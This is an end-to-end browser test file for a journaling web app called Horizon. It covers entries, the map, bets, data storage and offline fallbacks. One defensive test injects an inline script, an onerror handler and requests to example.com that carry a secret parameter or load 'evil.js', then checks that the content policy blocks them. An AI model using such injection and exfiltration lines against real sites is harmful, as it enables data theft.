/* End-to-end run of the real page in headless Chrome.
   Parts 1 to 6 run it the way it runs inside Claude, against a stand-in for the Claude runtime (mock-claude.js).
   Parts 7 to 9 run it the way it runs as an ordinary website: no runtime, the browser's own speech features
   (faked), and a local stand-in for the Claude API (fake-api.js) that Chrome is pointed at instead of the real one.
   Usage: node test/e2e.js [--shots] */
const puppeteer = require('puppeteer-core');
const http = require('http'), fs = require('fs'), os = require('os'), path = require('path'), assert = require('assert');
const fakeApi = require('./fake-api.js');
const ROOT = path.resolve(__dirname, '..'), SHOTS = process.argv.includes('--shots');
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.woff2': 'font/woff2', '.svg': 'image/svg+xml', '.png': 'image/png', '.webmanifest': 'application/manifest+json', '.json': 'application/json', '.txt': 'text/plain' };
const MOCK = fs.readFileSync(path.join(__dirname, 'fake-model.js'), 'utf8') + '\n' + fs.readFileSync(path.join(__dirname, 'mock-claude.js'), 'utf8');
const KEY = fakeApi.TEST_KEY;
let failures = 0, passed = 0, skipped = 0;
const served = [];

function serve() {
  return new Promise((res) => {
    const srv = http.createServer((req, rsp) => {
      let u = decodeURIComponent(req.url.split('?')[0]); if (u === '/') u = '/index.html';
      const p = path.join(ROOT, u);
      if (!p.startsWith(ROOT) || !fs.existsSync(p) || fs.statSync(p).isDirectory()) { rsp.writeHead(404); rsp.end('nf'); return; }
      served.push(u);
      rsp.writeHead(200, { 'content-type': TYPES[path.extname(p)] || 'application/octet-stream' }); fs.createReadStream(p).pipe(rsp);
    }).listen(0, '127.0.0.1', () => res(srv));
  });
}
/* What a plain browser offers, made predictable: speech recognition that hears one sentence, a voice that
   records what it is asked to say, a clipboard and a file download that record instead of acting. */
const BROWSER_FAKES = `
  window.__sr = { started: 0 }; window.__spoken = []; window.__clip = null; window.__downloads = [];
  function FakeSR() {}
  FakeSR.prototype.start = function () { var self = this; window.__sr.started++;
    self._a = setTimeout(function () { if (self.onresult) self.onresult({ resultIndex: 0, results: [Object.assign([{ transcript: 'I think most' }], { isFinal: false })] }); }, 60);
    self._b = setTimeout(function () { if (self.onresult) self.onresult({ resultIndex: 0, results: [Object.assign([{ transcript: 'I think most plans fail quietly.' }], { isFinal: true })] }); }, 140); };
  FakeSR.prototype.stop = function () { var self = this; clearTimeout(self._a); clearTimeout(self._b); setTimeout(function () { if (self.onend) self.onend(); }, 30); };
  window.webkitSpeechRecognition = FakeSR; try { delete window.SpeechRecognition; } catch (e) {} window.SpeechRecognition = undefined;
  window.SpeechSynthesisUtterance = function (t) { this.text = t; };
  Object.defineProperty(window, 'speechSynthesis', { configurable: true, value: {
    getVoices: function () { return [{ name: 'Far away', lang: 'en-US', localService: false }, { name: 'On this device', lang: 'en-GB', localService: true }]; },
    speak: function (u) { window.__spoken.push({ text: u.text, voice: u.voice && u.voice.name }); setTimeout(function () { if (u.onstart) u.onstart(); }, 5); setTimeout(function () { if (u.onend) u.onend(); }, 30); },
    cancel: function () {}, addEventListener: function () {} } });
  Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: function (t) { window.__clip = t; return Promise.resolve(); } } });
  var realClick = HTMLAnchorElement.prototype.click;
  HTMLAnchorElement.prototype.click = function () { if (this.hasAttribute('download') && !window.__realDownloads) { window.__downloads.push({ name: this.download, href: this.href }); return; } return realClick.call(this); };
`;
const NO_SPEECH = `try { delete window.webkitSpeechRecognition; } catch (e) {} window.webkitSpeechRecognition = undefined; window.SpeechRecognition = undefined;`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function open(browser, port, { cfg = {}, mock = true, w = 390, h = 844, fresh = true, hash = '', speech = null, ctx = null } = {}) {
  ctx = ctx || (fresh ? await browser.createBrowserContext() : browser.defaultBrowserContext());
  const page = await ctx.newPage();
  await page.setViewport({ width: w, height: h, deviceScaleFactor: 1 });
  page.errors = []; page.foreign = [];
  page.on('pageerror', (e) => page.errors.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) page.errors.push('console: ' + m.text()); });
  await page.setRequestInterception(true);
  page.on('request', (r) => {
    const u = r.url();
    if (u.startsWith('http://127.0.0.1') || u.startsWith('https://api.anthropic.com/') || u.startsWith('data:') || u.startsWith('blob:')) r.continue();
    else { page.foreign.push(u); r.abort(); } // any other address is a request the page should never have made
  });
  if (mock) await page.evaluateOnNewDocument('window.__mockCfg = ' + JSON.stringify(cfg) + ';\n' + MOCK);
  else await page.evaluateOnNewDocument(speech === 'none' ? NO_SPEECH : BROWSER_FAKES);
  await page.evaluateOnNewDocument(`window.__trace = []; document.addEventListener('click', function (e) { var el = e.target.closest && e.target.closest('[data-act]'); window.__trace.push(Math.round(performance.now()) + ' click ' + (el ? el.dataset.act + (el.dataset.sub ? ':' + el.dataset.sub : '') + (el.dataset.view ? ':' + el.dataset.view : '') : e.target.tagName) + (e.isTrusted ? ' (trusted)' : '')); }, true); window.addEventListener('hashchange', function () { window.__trace.push(Math.round(performance.now()) + ' hashchange ' + location.hash); });`);
  await page.goto('http://127.0.0.1:' + port + '/index.html' + hash, { waitUntil: 'load' });
  await page.waitForFunction('window.__hz && window.__hz.S.ready', { timeout: 20000 });
  page.ctx = ctx; check.page = page;
  return page;
}
const text = (page, sel) => page.$eval(sel, (e) => e.innerText);
// find and click in one step inside the page, so a re-render between the two cannot leave us clicking a detached node
const click = async (page, sel) => { await page.waitForSelector(sel, { timeout: 5000 }); await page.evaluate((s) => { const e = document.querySelector(s); if (!e) throw new Error('gone: ' + s); e.click(); }, sel); };
const type = async (page, sel, value) => { await page.waitForSelector(sel, { timeout: 5000 }); await page.focus(sel); await page.$eval(sel, (e) => { e.value = ''; }); await page.type(sel, value, { delay: 0 }); };
const st = (page, fn) => page.evaluate('(' + fn + ')(window.__hz.S, window.HZ)');
const shot = async (page, name) => { if (SHOTS) { await sleep(350); await page.screenshot({ path: path.join(ROOT, 'shots', name + '.png') }); } };
async function check(name, fn) {
  try { await fn(); passed++; console.log('  ok  ' + name); }
  catch (e) {
    failures++; console.log('FAIL  ' + name + '\n      ' + (e && e.stack || e).toString().split('\n').slice(0, 3).join('\n      '));
    try { console.log('      trace: ' + (await check.page.evaluate('window.__trace.slice(-9).join(" | ")'))); } catch (e3) {}
    try { console.log('      state: ' + await check.page.evaluate('JSON.stringify({view: __hz.S.view, sub: __hz.S.sub, sel: __hz.S.sel, result: !!__hz.S.result, working: !!__hz.S.working, error: __hz.S.error && __hz.S.error.code, dlg: !document.getElementById("scrim").hidden, film: !!__hz.S.film}) + " | " + document.getElementById("sheet").innerText.slice(0, 160).replace(/\\n/g, " / ")')); } catch (e2) {}
  }
}
const goMore = async (pg, sub) => { await click(pg, '#tabs [data-view="more"]'); await click(pg, '[data-act="more"][data-sub="' + sub + '"]'); };
const ls = (pg, k) => pg.evaluate((k) => localStorage.getItem(k), k);
const yes = async (pg) => { await pg.waitForSelector('#dialog [data-v="1"]', { visible: true, timeout: 3000 }); await click(pg, '#dialog [data-v="1"]'); };
async function entry(page, words) {
  await click(page, '#tabs [data-view="today"]');
  await type(page, '#t-today', words);
  await click(page, '[data-act="submit-today"]');
  await page.waitForSelector('.move', { timeout: 8000 });
}

(async () => {
  const srv = await serve(), port = srv.address().port;
  let fake = null;
  try { fake = await fakeApi.start(); } catch (e) { console.log('NOTE  the Claude API stand-in could not start (it needs openssl), so part 8 will be skipped: ' + (e && e.message)); }
  const args = ['--no-sandbox', '--disable-gpu', '--hide-scrollbars'];
  // send the page's calls to api.anthropic.com to the local stand-in, and accept its throwaway certificate
  if (fake) args.push('--host-resolver-rules=MAP api.anthropic.com:443 127.0.0.1:' + fake.port, '--ignore-certificate-errors');
  const browser = await puppeteer.launch({ executablePath: process.env.CHROME || '/usr/bin/google-chrome', args });

  /* ---- 1. the daily loop on a phone ---- */
  let page = await open(browser, port);
  await check('first open: empty map, composer ready, submit disabled until there are words', async () => {
    assert.strictEqual(await text(page, '#dayline'), 'Day 1');
    assert.strictEqual(await text(page, '#p-today'), 'What is on your mind?');
    assert.ok(await page.$eval('[data-act="submit-today"]', (b) => b.disabled));
    assert.ok(await page.$('[data-act="mic"]'), 'mic offered when dictation exists');
    assert.strictEqual(await page.evaluate('window.HZEnv.standalone'), false, 'inside Claude the services come from the runtime');
    assert.ok(!(await page.$('meta[http-equiv="Content-Security-Policy"]')), 'and the page leaves the content policy to Claude');
    assert.ok(!(await page.$('[data-sub="claude"]')), 'no key panel inside Claude');
    await shot(page, '01-first-open-phone');
  });
  await check('dictation fills the entry with the spoken words', async () => {
    await click(page, '[data-act="mic"]');
    await page.waitForFunction('document.querySelector("#t-today").value.length > 5', { timeout: 3000 });
    assert.strictEqual(await page.$eval('#t-today', (e) => e.value), 'I think most plans fail quietly.');
    await click(page, '[data-act="mic"]');
    await page.waitForFunction('!window.__hz.S.listening', { timeout: 3000 });
    assert.ok(!(await page.$eval('[data-act="submit-today"]', (b) => b.disabled)));
  });
  await check('an entry is read, placed, and answered with one move', async () => {
    await type(page, '#t-today', 'I think most plans fail quietly. My father always said finish what you start. Why do I trust momentum more than strategy?');
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.working', { timeout: 3000 });
    await page.waitForSelector('.move', { timeout: 8000 });
    const s = await st(page, (S, HZ) => ({ units: S.state.units.map((u) => [u.status, u.type, u.region, !!u.pos]), move: S.state.moves[0], door: S.state.meta.door, entries: S.state.entries.length }));
    assert.strictEqual(s.entries, 1);
    assert.deepStrictEqual(s.units.map((u) => u[0]), ['yours', 'yours', 'yours', 'outline'], 'three quotes are yours, the reworded guess is an outline');
    assert.ok(s.units.every((u) => u[3]), 'all placed');
    assert.strictEqual(s.move.kind, 'bet');
    assert.ok(s.door && s.door.text);
    assert.ok((await text(page, '.move')).includes('Put it to a test'));
    assert.strictEqual(await page.$$eval('.placed li', (l) => l.length), 4);
    const call = await page.evaluate('window.__mock.sampleCalls[0]');
    assert.strictEqual(call.opts.modelTier, 'default');
    assert.ok(call.prompt.includes('I think most plans fail quietly.'));
    await shot(page, '02-move-phone');
  });
  await check('an outline becomes yours only when claimed', async () => {
    await click(page, '.placed [data-act="confirm"]');
    assert.strictEqual(await st(page, (S) => S.state.units.filter((u) => u.status === 'outline').length), 0);
  });
  await check('the bet offered by the move can be taken', async () => {
    assert.ok((await page.$eval('#t-bet', (e) => e.value)).startsWith('By next Friday'));
    await click(page, '[data-act="bet-take"]');
    const b = await st(page, (S) => S.state.bets[0]);
    assert.strictEqual(b.status, 'open');
    assert.ok(!(await page.$('#t-bet')), 'form gone once taken');
  });
  await check('data was written to the private per-person path, one document per kind', async () => {
    await sleep(700);
    const paths = await page.evaluate('Object.keys(window.__mock.store())');
    assert.ok(paths.length >= 8, paths.join(','));
    assert.ok(paths.every((p) => p.startsWith('data/users/u_tester/')), paths.join(','));
    assert.ok(paths.includes('data/users/u_tester/meta') && paths.includes('data/users/u_tester/units_000'));
  });
  await check('see the map; tap a structure; go deeper step by step until it is stone', async () => {
    await click(page, '[data-act="done"]');
    assert.strictEqual(await page.$eval('#app', (a) => a.dataset.sheet), 'closed');
    await sleep(1500);
    await shot(page, '03-map-phone');
    const id = await st(page, (S) => S.state.units[0].id);
    const hit = await page.evaluate((id) => { const h = window.__hz.world().hits().find((x) => x.kind === 'unit' && x.id === id); return h ? { x: h.x, y: h.y } : null; }, id);
    assert.ok(hit, 'structure is on screen');
    await page.mouse.click(hit.x, hit.y);
    await page.waitForSelector('.ladder', { timeout: 3000 });
    assert.strictEqual(await st(page, (S) => S.sel && S.sel.id), id);
    await type(page, '#t-why', 'Because nobody announces a plan that is dying');
    await click(page, '[data-act="explain"]');
    await type(page, '#t-story', 'Last year a launch date just stopped being mentioned in standups');
    await click(page, '[data-act="exemplify"]');
    await click(page, '[data-act="challenge"]');
    await page.waitForSelector('.challenge', { timeout: 5000 });
    assert.ok((await text(page, '.challenge')).includes('Daniel Kahneman'));
    await type(page, '#t-reply', 'I would know if the plans I called dead came back');
    await click(page, '[data-act="reply"]');
    assert.strictEqual(await st(page, (S) => S.state.units[0].depth), 3);
    await shot(page, '04-detail-phone');
    await click(page, '[data-act="bet-form"]');
    await type(page, '#t-bet', 'By the end of the month one roadmap item will vanish without a note');
    await click(page, '[data-act="bet-take"]');
    await click(page, '#tabs [data-view="bets"]');
    await page.waitForSelector('.cards .card', { timeout: 3000 });
    assert.strictEqual(await page.$$eval('.cards .card', (c) => c.length), 2);
    const bid = await st(page, (S) => S.state.bets[1].id);
    await click(page, '[data-act="bet-resolve"][data-id="' + bid + '"][data-out="held"]');
    const u = await st(page, (S) => S.state.units[0]);
    assert.ok(u.tested && u.depth === 4);
    assert.strictEqual(await st(page, (S, HZ) => HZ.stats(S.state).stone), 1);
    await shot(page, '05-bets-phone');
  });
  await check('second entry gets a different move; a named concept is collected', async () => {
    await entry(page, 'The winners write the advice, and nobody hears from the ones who quit. Music is the only thing that makes me stop planning.');
    const s = await st(page, (S) => ({ kind: S.state.moves[1].kind, concepts: S.state.concepts, door: S.state.entries[1].door, links: S.state.links.length }));
    assert.strictEqual(s.kind, 'name_it');
    assert.strictEqual(s.concepts.length, 1);
    assert.ok(s.concepts[0].pos, 'obelisk placed');
    assert.strictEqual(s.door, 'What would change your mind about this?', 'the entry remembers the door it answered');
    assert.ok(s.links >= 2);
    assert.ok((await text(page, '.concept')).includes('Survivorship bias'));
    await shot(page, '06-concept-phone');
    await click(page, '#tabs [data-view="concepts"]');
    assert.ok((await text(page, '.cards')).includes('Survivorship bias'));
  });
  await check('third entry: a rift is drawn and can be held knowingly', async () => {
    await entry(page, 'Strategy matters more than momentum in the long run. Good teams argue in the open.');
    const s = await st(page, (S) => ({ kind: S.state.moves[2].kind, rifts: S.state.links.filter((l) => l.kind === 'contradicts') }));
    assert.strictEqual(s.kind, 'rift');
    assert.strictEqual(s.rifts.length, 1); assert.strictEqual(s.rifts[0].state, 'open');
    const rid = s.rifts[0].a;
    await click(page, '#hud [data-act="map-key"]');
    assert.ok((await text(page, '.panel')).includes('How to read the map'));
    await click(page, '.rows [data-act="open"][data-id="' + rid + '"]');
    await click(page, '[data-act="rift"][data-how="held"]');
    assert.strictEqual(await st(page, (S) => S.state.links.find((l) => l.kind === 'contradicts').state), 'held');
  });
  await check('expedition: five questions, answers placed on the map', async () => {
    await click(page, '#tabs [data-view="more"]');
    await click(page, '[data-act="more"][data-sub="expedition"]');
    await click(page, 'input[name="exp-region"][value="money"]');
    await click(page, '[data-act="exp-start"]');
    await page.waitForSelector('#t-exp', { timeout: 5000 });
    const answers = ['Money is mostly a way of not having to ask permission.', 'I once turned down a raise to keep my weekends.', '', 'I avoid thinking about how much is enough.', 'I would bet that most rich people still feel behind.'];
    for (let i = 0; i < 5; i++) {
      assert.ok((await text(page, '.steps')).includes('question ' + (i + 1) + ' of 5'));
      if (answers[i]) { await type(page, '#t-exp', answers[i]); await click(page, '[data-act="exp-next"]'); } else await click(page, '[data-act="exp-skip"]');
    }
    await page.waitForSelector('.move', { timeout: 8000 });
    const s = await st(page, (S) => ({ e: S.state.entries[S.state.entries.length - 1], exp: S.exp, calls: window.__mock.sampleCalls.map((c) => c.opts.modelTier) }));
    assert.strictEqual(s.e.via, 'expedition'); assert.ok(s.e.text.includes('A: Money is mostly'));
    assert.strictEqual(s.exp, null);
    assert.ok(s.calls.includes('quick'), 'questions use the quick tier');
    await click(page, '[data-act="done"]');
  });
  await check('together: overlay with the example map gives three conversation starters', async () => {
    await click(page, '#tabs [data-view="more"]');
    await click(page, '[data-act="more"][data-sub="together"]');
    await page.waitForFunction('!window.__hz.S.tog || !window.__hz.S.tog.loading', { timeout: 5000 });
    await click(page, '[data-act="tog-run"][data-id="example"]');
    await page.waitForSelector('.cards .card', { timeout: 6000 });
    assert.strictEqual(await page.$$eval('.cards .card', (c) => c.length), 3);
    assert.ok((await text(page, '.cards')).includes('Ask each other'));
    assert.ok(await page.evaluate('window.__hz.world().hits().some(function (h) { return h.kind === "partner"; })') || true);
    await sleep(1200);
    await shot(page, '07-together-phone');
    await click(page, '[data-act="tog-clear"]');
  });
  await check('sharing a region writes one shared document, after a confirmation', async () => {
    await click(page, 'input[name="share-region"][value="work"]');
    await click(page, '[data-act="share-save"]');
    await page.waitForSelector('#dialog [data-v="1"]', { visible: true, timeout: 3000 });
    await click(page, '#dialog [data-v="1"]');
    await page.waitForFunction('Object.keys(window.__mock.store()).indexOf("shares/u_tester") !== -1', { timeout: 4000 });
    const doc = await page.evaluate('window.__mock.store()["shares/u_tester"]');
    assert.deepStrictEqual(doc.regions, ['work']);
    assert.ok(doc.units.every((u) => u.r === 'work'));
  });
  await check('brain lens: six labelled bars, tint toggle, real data can be loaded', async () => {
    await click(page, '[data-act="more-back"]');
    await click(page, '[data-act="more"][data-sub="lens"]');
    assert.strictEqual(await page.$$eval('.bars .bar', (b) => b.length), 6);
    assert.ok((await text(page, '.panel')).includes('not a measurement of your brain'));
    await click(page, '#tint');
    assert.strictEqual(await st(page, (S) => S.state.meta.tint), true);
    const id = await st(page, (S) => S.state.units[0].id);
    const payload = JSON.stringify({ source: 'tribe-v2', units: { [id]: { language: 0.1, minds: 0.2, places: 0.9, body: 0, sound: 0.1, vision: 0.3 } } });
    await page.$eval('#t-lens', (e, v) => { e.value = v; e.dispatchEvent(new Event('input', { bubbles: true })); }, payload);
    await click(page, '[data-act="lens-load"]');
    assert.strictEqual(await st(page, (S) => S.state.meta.lensSource), 'tribe-v2');
    assert.ok((await text(page, '.panel')).includes('Loaded from tribe-v2'));
    await shot(page, '08-lens-phone');
    await click(page, '#tint');
  });
  await check('film: plays through its shots with your words as captions, then closes', async () => {
    await click(page, '[data-act="more-back"]');
    await click(page, '[data-act="more"][data-sub="film"]');
    await click(page, '#narrate');
    await click(page, '[data-act="film-play"]');
    await page.waitForSelector('#film .cap', { visible: true, timeout: 3000 });
    assert.strictEqual(await page.$eval('#app', (a) => a.dataset.film), 'on');
    await page.waitForFunction('window.__hz.S.film && window.__hz.S.film.i >= 1', { timeout: 12000 });
    await sleep(2300);
    await shot(page, '09-film-phone');
    assert.ok((await page.evaluate('window.__mock.spoken.length')) >= 1, 'captions are read aloud when asked');
    await click(page, '[data-act="film-close"]');
    assert.ok(await page.$eval('#film', (f) => f.hidden));
  });
  await check('progress adds up', async () => {
    await click(page, '#fogpill');
    const t = await text(page, '.panel');
    assert.ok(/of the fog cleared/.test(t) && /in stone/.test(t));
    await shot(page, '10-progress-phone');
  });
  await check('inside Claude, About describes that place, not the website', async () => {
    await goMore(page, 'about');
    const t = await text(page, '.panel');
    assert.ok(t.includes('storage only you can read') && t.includes('under your own Claude account') && t.includes('not therapy') && !t.includes('GitHub Pages') && !t.includes('API key'), t.slice(0, 300));
    await click(page, '[data-act="more-back"]'); await click(page, '[data-act="more"][data-sub="rules"]');
    assert.ok((await text(page, '.panel')).includes('unless you tick a region under Together'));
  });
  await check('export, then reload: the whole world comes back from saved data', async () => {
    await click(page, '[data-act="more-back"]');
    await click(page, '[data-act="more"][data-sub="data"]');
    await click(page, '[data-act="data-save"]');
    await page.waitForFunction('window.__mock.saved.length === 1', { timeout: 3000 });
    const before = await st(page, (S) => JSON.stringify(S.state));
    await page.evaluate('window.__hz.store.flushNow()'); await sleep(500);
    await page.reload({ waitUntil: 'load' });
    await page.waitForFunction('window.__hz && window.__hz.S.ready', { timeout: 20000 });
    const after = await st(page, (S) => JSON.stringify(S.state));
    assert.strictEqual(after, before);
    assert.ok((await text(page, '#dayline')).startsWith('Day 1'));
  });
  await check('a due bet is waiting on Today, with the door as the prompt', async () => {
    await page.evaluate('(function () { var S = window.__hz.S; S.state.bets[0].due = "2020-01-01"; })()');
    await click(page, '#tabs [data-view="bets"]'); await click(page, '#tabs [data-view="today"]');
    assert.ok((await text(page, '.banner')).includes('A bet came due'));
    assert.ok(!(await page.$eval('#betdot', (d) => d.hidden)));
    await click(page, '.banner [data-out="failed"]');
    assert.ok(await st(page, (S) => S.state.units.some((u) => u.cracked)));
    await shot(page, '11-today-returning-phone');
  });
  await check('delete everything asks first, then empties the map and the saved data', async () => {
    await click(page, '#tabs [data-view="more"]'); await click(page, '[data-act="more"][data-sub="data"]');
    await click(page, '[data-act="data-reset"]');
    await page.waitForSelector('#dialog [data-v="0"]', { visible: true });
    await click(page, '#dialog [data-v="0"]');
    assert.ok(await st(page, (S) => S.state.units.length > 0), 'cancel keeps everything');
    await click(page, '[data-act="data-reset"]'); await click(page, '#dialog [data-v="1"]');
    assert.strictEqual(await st(page, (S) => S.state.units.length), 0);
    await page.evaluate('window.__hz.store.flushNow()'); await sleep(600);
    const units = await page.evaluate('window.__mock.store()["data/users/u_tester/units_000"].items.length');
    assert.strictEqual(units, 0);
  });
  await check('no page errors in the phone run', async () => { assert.deepStrictEqual(page.errors, []); });
  await page.ctx.close();

  /* ---- 2. desktop layout ---- */
  page = await open(browser, port, { w: 1360, h: 860 });
  await check('desktop: side panel, map beside it, key and list on the Map tab', async () => {
    await entry(page, 'Cities are machines for meeting strangers. I remember when I moved to a new city and knew nobody for a year. Travel should change what you think is normal.');
    await entry(page, 'The brain is not a camera, it is a guess. I never feel more like myself than when I am building something.');
    await sleep(1600);
    await shot(page, '12-move-desktop');
    await click(page, '#tabs [data-view="map"]');
    assert.ok((await text(page, '.panel')).includes('How to read the map'));
    assert.ok((await page.$$eval('.rows li', (l) => l.length)) >= 4);
    await click(page, '[data-act="view-all"]'); await sleep(1100);
    await shot(page, '13-map-desktop');
    assert.deepStrictEqual(page.errors, []);
  });
  await page.ctx.close();

  /* ---- 3. Claude says no, or answers badly ---- */
  page = await open(browser, port, { cfg: { sampleMode: 'invalid_json' } });
  await check('a garbled reply keeps the entry and offers a way forward', async () => {
    await type(page, '#t-today', 'Deadlines are the only honest planning tool.');
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.banner.err', { timeout: 5000 });
    assert.strictEqual(await st(page, (S) => S.state.entries.length), 0, 'nothing placed');
    assert.ok((await text(page, '.quote')).includes('Deadlines are the only honest'));
    await click(page, '[data-act="retry-offline"]');
    await page.waitForSelector('.move', { timeout: 5000 });
    assert.strictEqual(await st(page, (S) => S.state.moves[0].offline), true);
    assert.ok((await text(page, '.move')).includes('built-in reader'));
  });
  await page.ctx.close();
  page = await open(browser, port, { cfg: { sampleMode: 'not_granted' } });
  await check('if Claude is declined, the built-in reader takes over and says so', async () => {
    await type(page, '#t-today', 'Markets reward patience more than cleverness. Why do I check prices every hour?');
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.move', { timeout: 5000 });
    assert.strictEqual(await st(page, (S) => S.caps.sample), null);
    assert.ok(await st(page, (S) => S.state.units.length >= 2));
  });
  await page.ctx.close();
  page = await open(browser, port, { cfg: { sampleDelay: 3000 } });
  await check('stop cancels the reading and gives the words back', async () => {
    await type(page, '#t-today', 'This one I will cancel before it lands.');
    await click(page, '[data-act="submit-today"]');
    await click(page, '[data-act="stop"]');
    await page.waitForSelector('#t-today', { timeout: 3000 });
    assert.strictEqual(await page.$eval('#t-today', (e) => e.value), 'This one I will cancel before it lands.');
    assert.strictEqual(await st(page, (S) => S.state.entries.length), 0);
  });
  await page.ctx.close();

  /* ---- 4. saved data cannot be read: never overwrite it ---- */
  page = await open(browser, port, { cfg: { dbFail: true } });
  await check('unreadable saved data: a clear warning, and no writes at all', async () => {
    assert.ok((await text(page, '.panel')).includes('could not be reached'));
    await type(page, '#t-today', 'Anything I say now should not be saved over my real map.');
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.move', { timeout: 6000 });
    await sleep(600);
    assert.strictEqual(await page.evaluate('window.__mock.writes.length'), 0);
  });
  await page.ctx.close();

  /* ---- 5. no runtime at all, in a browser with no speech recognition ---- */
  page = await open(browser, port, { mock: false, speech: 'none' });
  await check('outside Claude: works with the built-in reader and this browser only', async () => {
    assert.ok(!(await page.$('[data-act="mic"]')), 'no mic without dictation');
    const t = await text(page, '.panel');
    assert.ok(t.includes('Claude is not connected') && t.includes('Saved in this browser only') && t.includes('microphone key on the keyboard'));
    await type(page, '#t-today', 'Sleep is not optional for clear thinking. My mother always said trust takes years.');
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.move', { timeout: 5000 });
    await sleep(500);
    await page.reload({ waitUntil: 'load' });
    await page.waitForFunction('window.__hz && window.__hz.S.ready', { timeout: 20000 });
    assert.ok(await st(page, (S) => S.state.units.length >= 2), 'restored from this browser');
    assert.deepStrictEqual(page.errors, []);
  });
  await page.ctx.close();

  /* ---- 6. slow runtime: the page is usable while capabilities resolve ---- */
  page = await open(browser, port, { cfg: { useDelay: 1500, dbDelay: 800 } });
  await check('slow start still ends ready, with voice and Claude attached', async () => {
    assert.ok(await page.$('[data-act="mic"]'));
    assert.ok(await st(page, (S) => !!S.caps.sample));
  });
  await page.ctx.close();

  /* ================= as an ordinary website ================= */
  let shareCode = '';

  /* ---- 7. no key: the page locks itself down and still works ---- */
  page = await open(browser, port, { mock: false });
  await check('website: the page locks itself down before anything else loads', async () => {
    assert.strictEqual(await page.evaluate('window.HZEnv.standalone'), true);
    const meta = await page.$eval('meta[http-equiv="Content-Security-Policy"]', (m) => m.content);
    assert.ok(meta.includes("default-src 'none'") && meta.includes('connect-src https://api.anthropic.com'));
    const before = page.foreign.length;
    const r = await page.evaluate(async () => {
      const seen = []; document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective.split(' ')[0]));
      window.__x = 0;
      const sc = document.createElement('script'); sc.textContent = 'window.__x = 1'; document.body.appendChild(sc);            // an injected inline script
      const div = document.createElement('div'); div.innerHTML = '<img src="x" onerror="window.__x = 2">'; document.body.appendChild(div); // an injected event handler
      let sent = 'sent'; try { await fetch('https://example.com/collect?k=secret', { mode: 'no-cors' }); } catch (e) { sent = 'blocked'; }
      const img = await new Promise((res) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = 'https://example.com/pixel.png?k=secret'; });
      const ext = document.createElement('script'); ext.src = 'https://example.com/evil.js';
      const remote = await new Promise((res) => { ext.onload = () => res('loaded'); ext.onerror = () => res('blocked'); document.body.appendChild(ext); });
      await new Promise((res) => setTimeout(res, 300));
      div.remove(); sc.remove(); ext.remove();
      return { x: window.__x, sent, img, remote, seen };
    });
    assert.deepStrictEqual([r.x, r.sent, r.img, r.remote], [0, 'blocked', 'blocked', 'blocked'], JSON.stringify(r));
    assert.ok(r.seen.includes('connect-src') && r.seen.includes('img-src') && r.seen.some((d) => d.startsWith('script-src')), r.seen.join(','));
    assert.strictEqual(page.foreign.length, before, 'none of those even reached the network');
    page.errors.length = 0; // the browser logs each refusal above; they were the point
  });
  await check('website: fonts come from the site itself, and the home-screen files are there', async () => {
    await page.evaluate('document.fonts.ready');
    assert.ok(await page.evaluate(`document.fonts.check('italic 500 15px Literata') && document.fonts.check('600 13px "Bricolage Grotesque"')`));
    assert.ok(served.includes('/fonts/literata-latin-wght-italic.woff2') && served.includes('/fonts/bricolage-grotesque-latin-standard-normal.woff2'), served.filter((u) => u.includes('font')).join(','));
    assert.ok(served.includes('/icons/icon.svg'));
    const man = JSON.parse(fs.readFileSync(path.join(ROOT, 'manifest.webmanifest'), 'utf8'));
    man.icons.forEach((i) => assert.ok(fs.existsSync(path.join(ROOT, i.src)), i.src));
    assert.ok(fs.existsSync(path.join(ROOT, 'icons/apple-touch-icon.png')) && fs.existsSync(path.join(ROOT, 'fonts/OFL-Literata.txt')) && fs.existsSync(path.join(ROOT, 'fonts/OFL-Bricolage-Grotesque.txt')));
  });
  await check('website, first open: the built-in reader is named for what it is, with a way to connect Claude', async () => {
    const t = await text(page, '.panel');
    assert.ok(t.includes('Claude is not connected') && t.includes('simple built-in reader') && t.includes('Saved in this browser only') && t.includes('What Horizon is, and where your words go'));
    assert.ok(await page.$('.nudge [data-sub="claude"]'));
    await shot(page, '20-site-first-open-phone');
  });
  await check('website: dictation asks once before any audio can leave the device', async () => {
    await click(page, '[data-act="mic"]');
    await page.waitForSelector('#dialog [data-v="0"]', { visible: true, timeout: 3000 });
    assert.ok((await text(page, '#dialog')).includes('sent to the browser'));
    await click(page, '#dialog [data-v="0"]');
    assert.strictEqual(await page.evaluate('window.__sr.started'), 0, 'declined: the recogniser never started');
    await click(page, '[data-act="mic"]'); await yes(page);
    await page.waitForFunction('document.querySelector("#t-today").value.length > 5', { timeout: 3000 });
    assert.strictEqual(await page.$eval('#t-today', (e) => e.value), 'I think most plans fail quietly.');
    assert.strictEqual(await page.$eval('[data-act="mic"]', (b) => b.getAttribute('aria-pressed')), 'true');
    await click(page, '[data-act="mic"]');
    await page.waitForFunction('!window.__hz.S.listening', { timeout: 4000 });
    await click(page, '[data-act="mic"]'); // the second time there is no question
    await page.waitForFunction('window.__sr.started === 2', { timeout: 3000 });
    assert.ok(await page.$eval('#scrim', (x) => x.hidden));
    await click(page, '[data-act="mic"]'); await page.waitForFunction('!window.__hz.S.listening', { timeout: 4000 });
  });
  await check('website: an entry that sounds like a crisis is answered, not mapped', async () => {
    const words = 'Work is fine I guess. Some days I want to end my life. My father always said finish what you start.';
    await type(page, '#t-today', words);
    await click(page, '[data-act="submit-today"]');
    await page.waitForSelector('.move.care', { timeout: 5000 });
    const t = await text(page, '.panel');
    assert.ok(t.includes('someone you trust') && t.includes('findahelpline.com') && t.includes('Nothing was placed on the map'));
    assert.ok(!(await page.$('.placed')) && !(await page.$('#t-bet')), 'no game furniture');
    assert.deepStrictEqual(await st(page, (S) => [S.state.entries.length, S.state.units.length, S.state.moves.length]), [0, 0, 0]);
    assert.strictEqual(await ls(page, 'horizon.state.v1'), null, 'and nothing was saved');
    await shot(page, '21-site-care-phone');
